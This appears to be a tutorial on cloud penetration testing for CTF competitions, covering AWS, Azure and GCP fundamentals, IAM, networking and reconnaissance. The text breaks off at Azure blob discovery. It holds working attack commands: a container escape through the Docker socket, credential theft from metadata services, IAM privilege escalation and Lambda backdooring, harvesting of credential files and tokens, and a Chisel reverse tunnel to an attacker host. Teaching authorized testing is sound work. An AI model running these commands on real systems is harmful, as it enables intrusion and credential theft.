# Syllabus

## Module 1: Cloud Fundamentals & Architecture

- Cloud service models (IaaS, PaaS, SaaS)
- Cloud deployment models
- Shared responsibility model
- Cloud provider architectures (AWS, Azure, GCP)
- Multi-tenancy and isolation
- Cloud networking basics
- Identity and Access Management (IAM) concepts

## Module 2: Reconnaissance & OSINT

- Cloud asset discovery
- Subdomain enumeration
- DNS reconnaissance
- Certificate transparency logs
- Bucket/blob enumeration
- Cloud IP range identification
- GitHub/GitLab reconnaissance
- Metadata service endpoints
- Public cloud resource scanning

## Module 3: AWS Security Testing

- S3 bucket enumeration and exploitation
- IAM misconfiguration identification
- EC2 instance metadata service (IMDS)
- Lambda function security
- RDS/database exposure
- CloudFront bypass techniques
- API Gateway testing
- AWS credential discovery
- SSM parameter store enumeration
- ECS/EKS container security

## Module 4: Azure Security Testing

- Azure Blob storage enumeration
- Azure AD reconnaissance
- Azure VM metadata service
- Storage account key exposure
- Azure Function exploitation
- Managed Identity exploitation
- Azure Key Vault enumeration
- Azure DevOps reconnaissance
- Service Principal abuse

## Module 5: GCP Security Testing

- GCS bucket enumeration
- GCP service account exploitation
- Compute Engine metadata service
- Cloud Functions security
- Cloud SQL exposure
- IAM privilege escalation
- Firebase misconfiguration
- GKE security testing

## Module 6: Container & Orchestration Security

- Docker enumeration
- Container escape techniques
- Kubernetes reconnaissance
- Pod security misconfigurations
- Service account token exploitation
- Helm chart vulnerabilities
- Container registry scanning
- Docker API exposure

## Module 7: Serverless Security

- Function enumeration
- Event injection
- Cold start exploitation
- Dependency vulnerabilities
- Environment variable extraction
- Function chaining attacks
- API trigger abuse

## Module 8: Cloud API Testing

- REST API enumeration
- GraphQL exploitation
- API authentication bypass
- Rate limiting bypass
- API key exposure
- Swagger/OpenAPI reconnaissance
- API versioning exploitation
- CORS misconfiguration

## Module 9: Cloud Storage Exploitation

- Public bucket discovery
- ACL misconfiguration
- Signed URL exploitation
- Storage account enumeration
- Pre-signed URL abuse
- Cross-account access
- Object versioning exploitation

## Module 10: IAM & Privilege Escalation

- Role enumeration
- Permission boundary bypass
- AssumeRole exploitation
- Service account impersonation
- Policy misconfiguration
- Credential harvesting
- Token theft and reuse
- MFA bypass techniques

## Module 11: Cloud Network Penetration

- VPC/VNet enumeration
- Security group misconfiguration
- Network ACL bypass
- VPN exploitation
- Load balancer abuse
- DNS zone transfer
- Transit gateway exploitation
- Service endpoint exposure

## Module 12: Database & Data Store Testing

- RDS/Cloud SQL exposure
- NoSQL injection (DynamoDB, CosmosDB)
- Database backup enumeration
- Snapshot exploitation
- Redis/Memcached exposure
- Elasticsearch misconfiguration
- Database credential extraction

## Module 13: CI/CD Pipeline Security

- Pipeline enumeration
- Secret extraction
- Build artifact manipulation
- Webhook exploitation
- Pipeline injection
- Container registry poisoning
- Deployment key exposure

## Module 14: Logging & Monitoring Evasion

- CloudTrail tampering
- Log deletion techniques
- Monitoring bypass
- Alert evasion
- Audit log manipulation
- GuardDuty/Security Center evasion

## Module 15: Cloud-Specific Tools (Kali Linux)

- Cloud enumeration tools
- Credential harvesting tools
- Exploitation frameworks
- Post-exploitation tools
- Privilege escalation tools
- Persistence mechanisms
- Exfiltration tools

## Module 16: Credential Management

- Access key discovery
- Token extraction
- Credential file locations
- Environment variable harvesting
- Instance profile exploitation
- Secret manager enumeration
- Password vault exploitation

## Module 17: Post-Exploitation Techniques

- Persistence establishment
- Lateral movement
- Data exfiltration
- Backdoor creation
- Resource hijacking
- Crypto-mining deployment
- Coverage track removal

## Module 18: Cloud-Native Application Security

- Microservices exploitation
- Service mesh vulnerabilities
- API gateway bypass
- Message queue exploitation
- Event-driven architecture attacks
- Distributed tracing exploitation

## Module 19: Compliance & Misconfiguration Scanning

- CIS benchmark violations
- Compliance framework mapping
- Security posture assessment
- Configuration audit
- Best practice violations
- Automated scanning tools

## Module 20: Reporting & Documentation

- Finding classification
- Severity scoring (CVSS)
- Proof of concept creation
- Remediation recommendations
- Report structure
- Evidence collection
- Timeline documentation

---

**Note**: This syllabus is for authorized security testing and CTF competitions only. Unauthorized access to cloud resources is illegal.

---

# Cloud Fundamentals & Architecture

## Cloud Service Models

### Infrastructure as a Service (IaaS)

IaaS provides virtualized computing resources over the internet. The provider manages physical infrastructure while you control operating systems, storage, and deployed applications.

**Key characteristics:**

- Virtual machines with root/administrator access
- Network configuration control (VPCs, subnets, routing)
- Storage management (block, object, file storage)
- Load balancers and other network appliances

**CTF exploitation surface:**

- Misconfigured security groups/firewall rules
- Exposed management interfaces (SSH, RDP, cloud APIs)
- Vulnerable VM images or outdated software
- Insecure storage buckets with excessive permissions
- Metadata service exploitation (SSRF to 169.254.169.254)

**Common IaaS offerings:**

- AWS: EC2, VPC, S3, EBS
- Azure: Virtual Machines, Virtual Networks, Blob Storage
- GCP: Compute Engine, VPC, Cloud Storage

### Platform as a Service (PaaS)

PaaS provides a development and deployment environment with managed runtime, middleware, and operating system. You deploy applications but don't manage underlying infrastructure.

**Key characteristics:**

- Managed runtime environments (Node.js, Python, Java, etc.)
- Automatic scaling and load balancing
- Integrated databases and caching
- CI/CD pipeline integration
- No direct OS access

**CTF exploitation surface:**

- Application-layer vulnerabilities (SQLi, XSS, RCE)
- API key leakage in environment variables
- Server-Side Request Forgery (SSRF) to internal services
- Subdomain takeovers on custom domains
- Container escape if containerized PaaS
- Build pipeline poisoning

**Common PaaS offerings:**

- AWS: Elastic Beanstalk, Lambda, RDS
- Azure: App Service, Azure Functions, Azure SQL
- GCP: App Engine, Cloud Functions, Cloud SQL

### Software as a Service (SaaS)

SaaS delivers complete applications over the internet. The provider manages everything from infrastructure to application logic. You only manage data and access controls.

**Key characteristics:**

- Web-based application access
- Multi-tenant architecture
- Subscription-based pricing
- No infrastructure management
- Limited customization

**CTF exploitation surface:**

- Account takeover (credential stuffing, phishing)
- OAuth misconfigurations
- API abuse and rate limit bypass
- Privilege escalation within the application
- Data exfiltration through legitimate features
- Subdomain enumeration for forgotten instances

**Common SaaS offerings:**

- Office 365, Google Workspace, Salesforce, Slack, GitHub

## Cloud Deployment Models

### Public Cloud

Services delivered over the public internet and shared across multiple organizations.

**Security considerations:**

- Shared infrastructure with logical isolation
- Provider-managed physical security
- Data residency and compliance requirements
- Potential for noisy neighbor attacks
- Reliance on provider's security controls

### Private Cloud

Dedicated cloud infrastructure used exclusively by one organization, hosted on-premises or by a third party.

**Security considerations:**

- Greater control over security configurations
- Dedicated hardware and network
- Internal compliance easier to maintain
- Higher operational overhead
- Still requires proper configuration

### Hybrid Cloud

Combination of public and private clouds, allowing data and application portability.

**Security considerations:**

- Complex network topology
- Multiple authentication boundaries
- Data transit security between environments
- Inconsistent security policies risk
- VPN/interconnect misconfigurations

**CTF exploitation opportunities:**

- Pivoting between public and private segments
- Exploiting trust relationships between environments
- VPN credential theft or weak VPN configurations
- API gateways bridging environments

### Multi-Cloud

Using services from multiple cloud providers simultaneously.

**Security considerations:**

- Different security models per provider
- Complex identity and access management
- Inconsistent logging and monitoring
- Tool sprawl and visibility gaps

## Shared Responsibility Model

The shared responsibility model defines security obligations split between cloud provider and customer. This boundary shifts based on service model.

### Provider Responsibilities (applies to all models)

- Physical datacenter security
- Hardware maintenance
- Network infrastructure
- Hypervisor security (for IaaS/PaaS)
- Physical storage destruction

### IaaS Responsibility Division

**Provider manages:**

- Virtualization layer
- Physical hosts and network
- Storage infrastructure
- Datacenter facilities

**Customer manages:**

- Operating system patching
- Application security
- Network configuration (security groups, NACLs)
- IAM policies and access control
- Data encryption
- Backup and disaster recovery
- Firewall configuration

**CTF implications:** Misconfigured security groups are customer responsibility and common vulnerabilities. Provider won't patch your OS or fix your weak IAM policies.

### PaaS Responsibility Division

**Provider manages:**

- Everything in IaaS, plus:
- Operating system and patches
- Runtime environment
- Middleware

**Customer manages:**

- Application code security
- Data security
- User access management
- API keys and secrets

**CTF implications:** Focus shifts to application vulnerabilities, credential leakage, and API abuse since infrastructure is abstracted.

### SaaS Responsibility Division

**Provider manages:**

- Everything in PaaS, plus:
- Application functionality
- Application security patches

**Customer manages:**

- User access control
- Data classification
- Appropriate usage
- Client endpoint security

**CTF implications:** Exploitation focuses on authentication, authorization flaws, and data access controls within the application.

## Cloud Provider Architectures

### AWS (Amazon Web Services)

**Core architecture concepts:**

**Regions and Availability Zones:**

- Regions: Geographic locations with multiple datacenters (us-east-1, eu-west-1)
- Availability Zones: Isolated datacenters within a region (us-east-1a, us-east-1b)
- Edge Locations: CloudFront CDN endpoints

**Identity and Access Management (IAM):**

- Users: Individual identities
- Groups: Collection of users
- Roles: Temporary credentials for services/users
- Policies: JSON documents defining permissions
- Instance profiles: Roles attached to EC2 instances

**Key services for CTF:**

- **EC2:** Virtual machines with metadata service at 169.254.169.254
- **S3:** Object storage with bucket policies and ACLs
- **Lambda:** Serverless functions with IAM execution roles
- **RDS:** Managed databases with security groups
- **VPC:** Virtual network with subnets, route tables, NACLs, security groups
- **CloudTrail:** Audit logging (often disabled or misconfigured)
- **Secrets Manager/Parameter Store:** Credential storage

**Common misconfigurations:**

- Overly permissive S3 bucket policies (public read/write)
- Security groups allowing 0.0.0.0/0 on sensitive ports
- Hardcoded IAM credentials in code
- Wildcard (*) IAM policies
- Disabled CloudTrail logging
- Public RDS snapshots

**Reconnaissance approach:**

```bash
# Enumerate S3 buckets (common patterns)
aws s3 ls s3://company-name --no-sign-request
aws s3 ls s3://company-backup --no-sign-request
aws s3 ls s3://company-prod --no-sign-request

# Check if credentials work
aws sts get-caller-identity

# Enumerate accessible resources
aws ec2 describe-instances
aws s3 ls
aws iam list-users
aws lambda list-functions
```

### Azure (Microsoft Azure)

**Core architecture concepts:**

**Geographic organization:**

- Regions: Physical locations (East US, West Europe)
- Availability Zones: Isolated locations within regions
- Resource Groups: Logical containers for resources
- Subscriptions: Billing and access boundary
- Management Groups: Organize multiple subscriptions

**Identity (Entra ID, formerly Azure AD):**

- Users and service principals
- Managed identities for Azure resources
- Role-Based Access Control (RBAC)
- Conditional access policies

**Key services for CTF:**

- **Virtual Machines:** Compute instances with managed disks
- **Blob Storage:** Object storage with access tiers
- **Azure Functions:** Serverless compute
- **SQL Database:** Managed relational database
- **Key Vault:** Secrets management
- **Virtual Networks:** VNets, NSGs, ASGs
- **Azure Resource Manager (ARM):** Deployment and management layer

**Common misconfigurations:**

- Public Blob containers with anonymous access
- Overly permissive RBAC assignments (Owner, Contributor at subscription level)
- Service principals with excessive permissions
- Storage account keys exposed
- NSGs allowing broad internet access
- Key Vault with weak access policies

**Reconnaissance approach:**

```bash
# Azure CLI authentication check
az account show

# List subscriptions and resources
az account list
az resource list
az vm list
az storage account list
az keyvault list

# Check storage blob containers
az storage container list --account-name <account>
az storage blob list --container-name <container> --account-name <account>
```

### GCP (Google Cloud Platform)

**Core architecture concepts:**

**Organizational structure:**

- Organization: Root node
- Folders: Group projects
- Projects: Core resource container with unique project ID
- Regions and Zones: Geographic distribution

**Identity and Access Management:**

- Google accounts and service accounts
- IAM roles (primitive, predefined, custom)
- Service account keys
- Workload Identity for GKE

**Key services for CTF:**

- **Compute Engine:** Virtual machine instances
- **Cloud Storage:** Object storage with buckets
- **Cloud Functions:** Event-driven serverless
- **Cloud SQL:** Managed databases
- **GKE (Google Kubernetes Engine):** Managed Kubernetes
- **Secret Manager:** Secrets storage
- **VPC Networks:** Software-defined networking
- **Cloud IAM:** Access control

**Common misconfigurations:**

- Public Cloud Storage buckets (allUsers, allAuthenticatedUsers)
- Overly broad IAM bindings at project level
- Service account key exposure
- Default Compute Engine service accounts with excessive permissions
- Firewall rules allowing 0.0.0.0/0
- Public GKE clusters without authorized networks

**Reconnaissance approach:**

```bash
# gcloud authentication check
gcloud auth list
gcloud config list

# Enumerate projects and resources
gcloud projects list
gcloud compute instances list
gcloud storage buckets list
gcloud sql instances list
gcloud functions list

# Check storage bucket permissions
gsutil ls gs://bucket-name
gsutil iam get gs://bucket-name
```

## Cross-Provider Reconnaissance Methodology

**1. Credential discovery:**

- Environment variables (`env | grep -i aws\|azure\|gcp`)
- Configuration files (~/.aws/credentials, ~/.azure/credentials, ~/.config/gcloud)
- Instance metadata services
- Application configuration files
- Version control history (git log, .git/config)

**2. Permission enumeration:**

- Test read-only operations first (list, describe, get)
- Map accessible resources across services
- Identify high-value targets (storage, secrets, databases)

**3. Privilege escalation paths:**

- IAM policy enumeration
- Service role assumption
- Metadata service abuse
- Credential harvesting from compromised resources

**4. Persistence mechanisms:**

- Creating new IAM users/service accounts
- SSH key injection into compute instances
- Backdooring Lambda/Cloud Functions
- Modifying security groups for future access

## Critical Security Boundaries

**Network isolation:**

- VPC/VNet segmentation limits lateral movement
- Security groups/NSGs are stateful firewalls at instance level
- NACLs/Network Security Rules are stateless at subnet level
- Private subnets without internet gateways

**Identity isolation:**

- IAM policies define resource access
- Service accounts should follow least privilege
- Cross-account/subscription access requires explicit trust
- Temporary credentials preferred over long-term keys

**Data isolation:**

- Encryption at rest (provider-managed or customer-managed keys)
- Encryption in transit (TLS, VPN)
- Bucket/container policies separate from IAM
- Database access control independent of network access

---

**Related critical topics:** Cloud IAM Exploitation, Cloud Storage Security Testing, Kubernetes Security, Container Escape Techniques, Cloud Metadata Service Exploitation

---

## Multi-tenancy and Isolation

### Architectural Foundation

**Multi-tenancy** describes cloud infrastructure where multiple customers (tenants) share the same physical resources while maintaining logical separation. Understanding isolation boundaries is critical for identifying attack surfaces in CTF cloud challenges.

### Isolation Layers

**Hardware-level Isolation:**

- **Type 1 Hypervisors** (bare-metal): VMware ESXi, Xen, KVM
- **Type 2 Hypervisors** (hosted): VirtualBox, VMware Workstation
- Direct hardware access for Type 1 provides stronger isolation
- Hypervisor escape vulnerabilities (CVE-2021-22555, CVE-2022-0847 "Dirty Pipe") allow container/VM breakout

**Container-level Isolation:**

- **Namespaces**: Separate process trees, network interfaces, mount points
    - PID namespace: Isolates process IDs
    - Network namespace: Separate network stacks
    - Mount namespace: Filesystem isolation
    - User namespace: UID/GID mapping
- **cgroups**: Resource limiting (CPU, memory, I/O)
- **seccomp**: Syscall filtering
- **AppArmor/SELinux**: Mandatory Access Control

### Common Isolation Breakout Techniques

**Container Escape Methods:**

```bash
# Check for privileged container (common misconfiguration)
capsh --print | grep cap_sys_admin

# Check for exposed Docker socket
ls -la /var/run/docker.sock

# If socket accessible, control host Docker daemon
docker -H unix:///var/run/docker.sock run -it --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host

# Check mounted filesystems for host exposure
mount | grep -E "proc|sys|dev"
df -h

# Kernel exploit detection
uname -a
cat /proc/version
searchsploit linux kernel $(uname -r | cut -d'-' -f1)
```

**Kubernetes Pod Escape:**

```bash
# Check service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Query Kubernetes API
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $KUBE_TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods

# Check for hostPath volumes
mount | grep /host

# Check capabilities
cat /proc/self/status | grep Cap
```

**Metadata Service Exploitation:**

```bash
# AWS metadata service (IMDSv1 - no token required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Azure metadata service
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# GCP metadata service
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Isolation Testing Tools

**From Kali Linux:**

```bash
# Container enumeration
sudo apt install -y docker.io
docker ps
docker images

# Kubernetes tools
sudo apt install -y kubectl
kubectl get pods --all-namespaces
kubectl auth can-i --list

# Container escape detection
sudo apt install -y amicontained
amicontained

# Install deepce (Docker enumeration)
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
```

---

## Cloud Networking Basics

### Virtual Network Architecture

**Key Components:**

- **Virtual Private Cloud (VPC)**: Isolated network segment
- **Subnets**: IP range subdivisions within VPC
- **Security Groups**: Stateful firewall rules at instance level
- **Network ACLs**: Stateless firewall rules at subnet level
- **Internet Gateway**: VPC connection to internet
- **NAT Gateway**: Allows outbound internet from private subnets
- **VPC Peering**: Direct network connection between VPCs
- **Transit Gateway**: Hub connecting multiple VPCs/networks

### Network Reconnaissance

**Internal Network Discovery:**

```bash
# Identify current network configuration
ip addr show
ip route show
cat /etc/resolv.conf

# Discover internal IP ranges
hostname -I
curl -s http://169.254.169.254/latest/meta-data/local-ipv4  # AWS
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip  # GCP

# Scan internal network
sudo apt install -y nmap
nmap -sn 10.0.0.0/24  # Ping scan
nmap -sV -Pn 10.0.0.0/24  # Service detection

# Cloud-specific scanning
nmap -sV -p 22,80,443,3389,5985,5986 --script cloud-* 10.0.0.0/24
```

**Security Group Enumeration:**

```bash
# AWS CLI - requires credentials
aws ec2 describe-security-groups --region us-east-1

# List security group rules
aws ec2 describe-security-groups --group-ids sg-xxxxxxxxx --query 'SecurityGroups[*].IpPermissions'

# Find overly permissive rules (0.0.0.0/0)
aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values='0.0.0.0/0' --query 'SecurityGroups[*].[GroupId,GroupName]'
```

**DNS Reconnaissance:**

```bash
# Install tools
sudo apt install -y dnsutils fierce dnsrecon dnsenum

# Subdomain enumeration
fierce --domain example.com
dnsrecon -d example.com -t brt -D /usr/share/wordlists/dnsmap.txt
dnsenum --dnsserver 8.8.8.8 --enum example.com

# Zone transfer attempt
dig axfr @ns1.example.com example.com

# Cloud provider detection via DNS
dig example.com
dig example.cloudfront.net  # AWS CloudFront
dig example.azurewebsites.net  # Azure
dig example.googleapis.com  # GCP
```

### Network Traffic Analysis

**Packet Capture:**

```bash
# Install tcpdump
sudo apt install -y tcpdump

# Capture traffic to metadata service
sudo tcpdump -i any -n host 169.254.169.254 -w metadata.pcap

# Capture and display HTTP traffic
sudo tcpdump -i any -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# Monitor DNS queries
sudo tcpdump -i any -n port 53
```

**Network Pivoting:**

```bash
# SSH tunneling
ssh -D 8080 user@pivot-host  # SOCKS proxy
ssh -L 3389:target:3389 user@pivot-host  # Local port forward
ssh -R 8080:localhost:80 user@attacker  # Remote port forward

# Chisel (reverse proxy over HTTP)
# On attacker machine:
./chisel server -p 8080 --reverse

# On compromised host:
./chisel client attacker-ip:8080 R:socks

# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn 10.0.0.0/24
```

### Service Mesh & Load Balancers

**Common Misconfigurations:**

- Exposed admin interfaces (Envoy admin port 9901, Istio pilot 15010)
- Unencrypted inter-service communication
- Missing mTLS enforcement
- Load balancer health check exposure

**Enumeration:**

```bash
# Check for exposed Envoy admin
curl http://target:9901/stats
curl http://target:9901/config_dump

# Istio service discovery
kubectl get virtualservices --all-namespaces
kubectl get destinationrules --all-namespaces

# Load balancer fingerprinting
curl -I https://target.com
# Look for headers: X-Amzn-Trace-Id (AWS ALB), X-Azure-Ref (Azure), Via: 1.1 google (GCP)
```

---

## Identity and Access Management (IAM)

### IAM Architecture

**Core Components:**

- **Principals**: Entities that can request actions (users, services, federated identities)
- **Policies**: JSON documents defining permissions
- **Roles**: Temporary credential sets with attached policies
- **Groups**: Collections of users sharing permissions
- **Service Accounts**: Non-human identities for applications

### Policy Analysis & Exploitation

**AWS IAM Policy Structure:**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::bucket-name/*",
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "203.0.113.0/24"
        }
      }
    }
  ]
}
```

**Policy Evaluation Logic:**

1. Explicit Deny wins (always)
2. Explicit Allow required (default deny)
3. Evaluate all applicable policies

**Common Privilege Escalation Vectors:**

```bash
# Install AWS enumeration tools
sudo apt install -y awscli
pip3 install pacu pmapper

# Enumerate current permissions
aws sts get-caller-identity
aws iam get-user
aws iam list-attached-user-policies --user-name username
aws iam list-user-policies --user-name username

# Privilege escalation via policy attachment
aws iam attach-user-policy --user-name target-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access keys for another user
aws iam create-access-key --user-name target-user

# Assume role (if allowed)
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/TargetRole --role-session-name test

# PassRole exploitation
aws lambda create-function --function-name evil --runtime python3.9 --role arn:aws:iam::123456789012:role/PrivilegedRole --handler index.handler --zip-file fileb://function.zip

# Update Lambda function code (if update permissions exist)
aws lambda update-function-code --function-name existing-function --zip-file fileb://backdoor.zip
```

**Automated IAM Privilege Escalation:**

```bash
# Pacu - AWS exploitation framework
pacu
import_keys --all
run iam__enum_permissions
run iam__privesc_scan
run iam__backdoor_assume_role

# PMMapper - AWS policy evaluation
pmapper graph create
pmapper query "who can do s3:GetObject on *"
pmapper analysis --principal arn:aws:iam::123456789012:user/lowpriv-user
```

### Azure AD & Entra ID

**Azure Identity Enumeration:**

```bash
# Install Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Install ROADtools
pip3 install roadrecon

# Azure login
az login
az account show

# Enumerate users and groups
az ad user list
az ad group list
az ad group member list --group "Administrators"

# Role assignments
az role assignment list --assignee user@domain.com
az role assignment list --all

# Service principal enumeration
az ad sp list --all
az ad sp credential list --id <app-id>

# ROADtools reconnaissance
roadrecon auth -u user@domain.com -p password
roadrecon gather
roadrecon gui  # Launch web interface
```

**Azure Token Theft:**

```bash
# Extract tokens from Azure CLI
cat ~/.azure/accessTokens.json
cat ~/.azure/azureProfile.json

# Extract tokens from Azure PowerShell (Windows)
# C:\Users\<user>\.Azure\TokenCache.dat
# C:\Users\<user>\.Azure\AzureRmContext.json

# Use stolen token
az account clear
export AZURE_ACCESS_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGc..."
az account list
```

### GCP IAM

**GCP Service Account Exploitation:**

```bash
# Install gcloud CLI
echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -
sudo apt update && sudo apt install -y google-cloud-cli

# Authenticate
gcloud auth login
gcloud config set project project-id

# Enumerate IAM policies
gcloud projects get-iam-policy project-id
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account=sa@project.iam.gserviceaccount.com

# Create service account key (privilege escalation)
gcloud iam service-accounts keys create key.json --iam-account=sa@project.iam.gserviceaccount.com

# Impersonate service account
gcloud auth activate-service-account --key-file=key.json
gcloud compute instances list
```

**GCP Metadata Service Exploitation:**

```bash
# Retrieve service account token from metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Use token directly
TOKEN=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r '.access_token')

curl -H "Authorization: Bearer $TOKEN" https://compute.googleapis.com/compute/v1/projects/project-id/zones/us-central1-a/instances
```

### IAM Enumeration Tools

**Cross-platform IAM Tools:**

```bash
# ScoutSuite - multi-cloud security auditing
pip3 install scoutsuite

# AWS
scout aws --profile default

# Azure
scout azure --cli

# GCP
scout gcp --user-account

# CloudMapper - AWS visualization
git clone https://github.com/duo-labs/cloudmapper.git
cd cloudmapper
pip3 install -r requirements.txt
python cloudmapper.py collect --account-name my-account
python cloudmapper.py prepare --account-name my-account
python cloudmapper.py webserver

# Prowler - AWS/Azure/GCP security assessment
git clone https://github.com/prowler-cloud/prowler
cd prowler
pip install -r requirements.txt
./prowler aws
./prowler azure
./prowler gcp
```

### Credential Harvesting Locations

**Linux Systems:**

```bash
# AWS credentials
cat ~/.aws/credentials
cat ~/.aws/config
env | grep AWS

# Azure credentials
cat ~/.azure/accessTokens.json
cat ~/.azure/clouds.config

# GCP credentials
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/access_tokens.db
cat ~/.config/gcloud/application_default_credentials.json

# Service account keys in application directories
find / -name "*service-account*.json" 2>/dev/null
find / -name "*credentials*.json" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null

# Environment variables
env | grep -E 'AWS|AZURE|GOOGLE|GCP|CLOUD'
cat /proc/*/environ | tr '\0' '\n' | grep -E 'AWS|AZURE|GOOGLE|GCP'
```

**Windows Systems:**

```cmd
# AWS credentials
type %USERPROFILE%\.aws\credentials
type %USERPROFILE%\.aws\config

# Azure credentials
type %USERPROFILE%\.azure\accessTokens.json
type %USERPROFILE%\.azure\azureProfile.json

# GCP credentials
type %APPDATA%\gcloud\credentials.db
type %APPDATA%\gcloud\access_tokens.db
```

### Policy Bypass Techniques

**Resource-based Policies vs Identity-based Policies:**

- Identity-based: Attached to users/roles/groups
- Resource-based: Attached to resources (S3 buckets, Lambda functions)
- [Inference] Cross-account access often relies on resource-based policies, which may have weaker controls

**Confused Deputy Attack:**

```bash
# Exploit service assuming roles on behalf of users
# If service doesn't validate aws:SourceAccount or aws:SourceArn conditions

# Example: Force service to assume privileged role
curl -X POST https://vulnerable-service.com/api/process \
  -H "Content-Type: application/json" \
  -d '{"roleArn":"arn:aws:iam::123456789012:role/AdminRole","action":"describe-instances"}'
```

**Condition Key Bypass:** [Inference] Services may not properly validate condition keys in policies (aws:SourceIp, aws:CurrentTime, etc.), though this depends on implementation.

---

## Related High-Value Topics

**Critical areas for deeper exploitation:**

- S3 bucket misconfigurations and public exposure techniques
- Lambda function injection and runtime manipulation
- Kubernetes RBAC exploitation and pod security policies
- Serverless framework vulnerabilities (API Gateway, CloudFunctions)
- Cloud logging and monitoring evasion techniques
- Cross-tenant attacks in SaaS environments

---

# Reconnaissance & OSINT

## Cloud Asset Discovery

Cloud asset discovery involves identifying an organization's cloud infrastructure, storage resources, and services across providers. This is the foundational phase of cloud penetration testing.

### IP Range Identification

**AWS IP ranges:** AWS publishes official IP ranges in JSON format. Download and parse for target identification.

```bash
# Download AWS IP ranges
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json -o aws-ranges.json

# Extract IP ranges by region
cat aws-ranges.json | jq -r '.prefixes[] | select(.region=="us-east-1") | .ip_prefix'

# Extract IP ranges by service
cat aws-ranges.json | jq -r '.prefixes[] | select(.service=="S3") | .ip_prefix'

# Find if target IP belongs to AWS
TARGET_IP="52.94.76.5"
cat aws-ranges.json | jq -r --arg ip "$TARGET_IP" '.prefixes[] | select(.ip_prefix | contains($ip))'
```

**Azure IP ranges:** Microsoft publishes weekly JSON files for Azure datacenter ranges.

```bash
# Download Azure IP ranges (URL changes weekly)
# Find current URL at: https://www.microsoft.com/en-us/download/details.aspx?id=56519
curl -s https://download.microsoft.com/download/... -o azure-ranges.json

# Extract by region
cat azure-ranges.json | jq -r '.values[] | select(.name | contains("AzureCloud.eastus")) | .properties.addressPrefixes[]'
```

**GCP IP ranges:** GCP publishes netblocks via DNS and JSON.

```bash
# Query via DNS
nslookup -q=TXT _cloud-netblocks.googleusercontent.com

# Get IP ranges
dig TXT _cloud-netblocks.googleusercontent.com +short | tr ' ' '\n' | grep include | cut -d: -f2

# Recursive lookup for all ranges
for block in $(dig TXT _cloud-netblocks.googleusercontent.com +short | grep include | cut -d: -f2); do
    dig TXT $block +short
done
```

### S3 Bucket Discovery

S3 buckets are a primary target due to frequent misconfigurations. Bucket names must be globally unique and follow DNS naming conventions.

**Naming patterns to test:**

- `company-name`
- `companyname-backup`
- `companyname-prod/staging/dev`
- `companyname-logs`
- `companyname-assets`
- `companyname-public`
- `www.companyname.com`
- `companyname.com`
- `backup-companyname`
- `companyname-documents`

**Discovery methods:**

```bash
# Method 1: Direct bucket access test (no authentication)
aws s3 ls s3://target-bucket --no-sign-request

# Method 2: HTTP enumeration (faster for bulk testing)
curl -I https://target-bucket.s3.amazonaws.com/
# 200 = exists and public
# 403 = exists but access denied
# 404 = does not exist

# Method 3: Virtual-hosted-style URL
curl -I https://s3.amazonaws.com/target-bucket/

# Method 4: Region-specific endpoints
curl -I https://target-bucket.s3.us-west-2.amazonaws.com/
```

**Automated bucket discovery:**

```bash
# Using s3scanner
git clone https://github.com/sa7mon/S3Scanner
cd S3Scanner
pip3 install -r requirements.txt

# Scan from wordlist
python3 s3scanner.py --buckets bucketnames.txt

# Using S3 Bucket Finder
git clone https://github.com/gwen001/s3-buckets-finder
cd s3-buckets-finder
python3 s3-buckets-finder.py --keyword company-name

# Using cloud_enum
git clone https://github.com/initstring/cloud_enum
cd cloud_enum
python3 cloud_enum.py -k company-name

# Using lazys3
docker run --rm -it nahamsec/lazys3 company-name
```

**Bucket enumeration once found:**

```bash
# List contents recursively
aws s3 ls s3://target-bucket --recursive --no-sign-request

# Download entire bucket (if permitted)
aws s3 sync s3://target-bucket ./local-folder --no-sign-request

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
```

### Azure Blob Storage Discovery

